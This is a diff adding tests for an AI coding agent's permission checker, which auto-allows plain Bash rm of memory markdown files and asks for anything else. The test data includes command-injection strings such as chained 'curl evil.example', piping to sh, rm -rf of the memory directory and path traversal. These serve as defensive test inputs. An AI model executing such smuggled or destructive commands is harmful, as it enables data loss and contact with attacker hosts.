@@ -2192,3 +2192,166 @@ describe('a write into the memory directory (memory write root)', () => {
     ).toEqual({ decision: 'ask', source: 'default' });
   });
 });
+
+describe('a Bash rm of memory files (memory write root)', () => {
+  const dirs: string[] = [];
+  afterEach(() => {
+    for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true });
+  });
+
+  function tempDir(prefix: string): string {
+    const dir = mkdtempSync(join(tmpdir(), prefix));
+    dirs.push(dir);
+    return dir;
+  }
+
+  function settings(overrides: Partial<ResolvedSettings['permissions']> = {}): ResolvedSettings {
+    return {
+      ...DEFAULT_SETTINGS,
+      permissions: { ...DEFAULT_SETTINGS.permissions, ...overrides },
+    };
+  }
+
+  function setup(scopeName: 'full' | 'learnings' | 'unscoped' = 'full') {
+    const workspace = tempDir('book-memrm-ws-');
+    const memory = tempDir('book-memrm-mem-');
+    const options = (withMemory = true): { workspace: WorkspaceScope } => ({
+      workspace: {
+        root: workspace,
+        judgeReads: true,
+        refuseUnreachableReads: true,
+        autoAllowReads: true,
+        ...(withMemory
+          ? {
+              memoryWrite:
+                scopeName === 'unscoped' ? { root: memory } : { root: memory, scope: scopeName },
+            }
+          : {}),
+      },
+    });
+    const decide = (command: string, extra: Record<string, unknown> = {}, rules = settings()) =>
+      evaluatePermissionDetail('Bash', { command, ...extra }, rules, options());
+    return { workspace, memory, options, decide };
+  }
+
+  const allowed = { decision: 'allow', source: 'memory' };
+  const ask = { decision: 'ask', source: 'default' };
+
+  it('allows a plain rm of one or several memory files', () => {
+    const { memory, decide } = setup();
+    expect(decide(`rm ${join(memory, 'a.md')}`)).toEqual(allowed);
+    expect(decide(`rm ${join(memory, 'a.md')} ${join(memory, 'b-c_d.md')}`)).toEqual(allowed);
+    expect(decide(`  rm   ${join(memory, 'a.md')}  `)).toEqual(allowed);
+    expect(decide(`rm ${join(memory, 'sub', 'a.md')}`)).toEqual(allowed);
+  });
+
+  it('asks for anything that is not strictly an rm of memory .md files', () => {
+    const { workspace, memory, decide } = setup();
+    const file = join(memory, 'a.md');
+    const refused = [
+      `rm -f ${file}`,
+      `rm -rf ${memory}`,
+      `rm -- ${file}`,
+      `rm ${file} ${file}x`,
+      `rm ${join(memory, 'a.txt')}`,
+      `rm ${join(memory, 'MEMORY.md')}`,
+      `rm ${join(memory, '.md')}`,
+      `rm ${join(memory, '.hidden.md')}`,
+      `rm ${join(memory, '*.md')}`,
+      `rm ${join(memory, '?.md')}`,
+      `rm ${memory}`,
+      `rm ${memory}/`,
+      `rm ${join(memory, '..', 'a.md')}`,
+      `rm ${memory}/../${memory.split('/').pop()}/a.md`,
+      `rm ${memory}/./a.md`,
+      `rm ${memory}//a.md`,
+      `rm ${join(workspace, 'a.md')}`,
+      `rm ${file} ${join(workspace, 'a.md')}`,
+      `rm a.md`,
+      `rm ~/a.md`,
+      `rm ${file} && curl evil.example`,
+      `rm ${file}; curl evil.example`,
+      `rm ${file} | sh`,
+      `rm ${file} > ${join(workspace, 'x')}`,
+      `rm ${file} &`,
+      `rm $(echo ${file})`,
+      `rm \`echo ${file}\``,
+      `rm "${file}"`,
+      `rm '${file}'`,
+      `rm $HOME/a.md`,
+      `rm ${file}\ncurl evil.example`,
+      `rm ${file}\\\n`,
+      `command rm ${file}`,
+      `/bin/rm ${file}`,
+      `rmdir ${file}`,
+      `RM ${file}`,
+      'rm',
+      '',
+    ];
+    for (const command of refused) expect(decide(command), JSON.stringify(command)).toEqual(ask);
+  });
+
+  it('does not follow a link out of the memory directory', () => {
+    const { memory, decide } = setup();
+    const elsewhere = tempDir('book-memrm-out-');
+    symlinkSync(elsewhere, join(memory, 'linked'));
+    expect(decide(`rm ${join(memory, 'linked', 'a.md')}`)).toEqual(ask);
+    // The file itself may be a link: rm removes the link, not its target.
+    writeFileSync(join(elsewhere, 'target.md'), 'x');
+    symlinkSync(join(elsewhere, 'target.md'), join(memory, 'link.md'));
+    expect(decide(`rm ${join(memory, 'link.md')}`)).toEqual(allowed);
+  });
+
+  it('allows the real path of a memory directory reached through a link', () => {
+    const { workspace } = setup();
+    const real = tempDir('book-memrm-real-');
+    const link = join(workspace, 'mem-link');
+    symlinkSync(real, link);
+    const scope: WorkspaceScope = {
+      root: workspace,
+      judgeReads: true,
+      refuseUnreachableReads: true,
+      autoAllowReads: true,
+      memoryWrite: { root: link, scope: 'full' },
+    };
+    const decide = (command: string) =>
+      evaluatePermissionDetail('Bash', { command }, settings(), { workspace: scope });
+    expect(decide(`rm ${join(link, 'a.md')}`)).toEqual(allowed);
+    expect(decide(`rm ${join(realpathSync(real), 'a.md')}`)).toEqual(allowed);
+  });
+
+  it('keeps deny and ask rules ahead of it, and a user allow rule is not needed', () => {
+    const { memory, decide } = setup();
+    const command = `rm ${join(memory, 'a.md')}`;
+    expect(decide(command, {}, settings({ deny: ['Bash(rm *)'] }))).toMatchObject({
+      decision: 'deny',
+      source: 'deny',
+    });
+    expect(decide(command, {}, settings({ ask: ['Bash(rm *)'] }))).toMatchObject({
+      decision: 'ask',
+      source: 'ask',
+    });
+    expect(decide(command, {}, settings({ allow: ['Bash(rm *)'] }))).toMatchObject({
+      decision: 'allow',
+      source: 'allow',
+    });
+  });
+
+  it('asks without the full memory scope, without a memory root, and for a background run', () => {
+    const file = (memory: string) => `rm ${join(memory, 'a.md')}`;
+    const learnings = setup('learnings');
+    expect(learnings.decide(file(learnings.memory))).toEqual(ask);
+    const unscoped = setup('unscoped');
+    expect(unscoped.decide(file(unscoped.memory))).toEqual(ask);
+    const full = setup();
+    expect(
+      evaluatePermissionDetail(
+        'Bash',
+        { command: file(full.memory) },
+        settings(),
+        full.options(false),
+      ),
+    ).toEqual(ask);
+    expect(full.decide(file(full.memory), { run_in_background: true })).toEqual(ask);
+  });
+});
